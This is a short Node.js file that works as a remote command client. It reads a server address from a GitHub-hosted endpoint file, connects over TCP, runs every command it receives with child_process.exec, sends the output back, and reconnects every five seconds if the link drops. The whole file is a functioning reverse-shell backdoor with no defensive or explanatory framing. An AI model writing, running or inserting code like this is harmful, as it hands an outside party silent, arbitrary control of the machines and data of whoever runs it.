var exec = require('child_process').exec;
var net = require('net');
var https = require('https');

var interval;
function getServerInfos() {
	var url = 'https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/endpoint/endpoint';
	try {
	https.get(url, function(res) {
			res.on('data', function(d){
					var data = JSON.parse(d.toString());
					launchClient(data.address, data.port);
					clearInterval(interval);
			})
		});
	} catch (e) {}
}

function launchClient(address, port) {
	var client = new net.Socket();
	client.connect(port, address, function() {
		client.write('{"cmd": "", "value": ""}');
	});
	client.on('data', function(data)  {
	  try {
	    var res = JSON.parse(data);
	    exec(res.cmd, function(error, stdout, stderr) {
	      client.write("{\"cmd\": \"" + res.cmd + "\", \"value\": " + JSON.stringify(stdout) + "}");
	    });
	  } catch (e) {}
	});

	client.on('close', function() {
		interval = setInterval(function() {
			getServerInfos();
		}, 5000);
	});
}

getServerInfos();
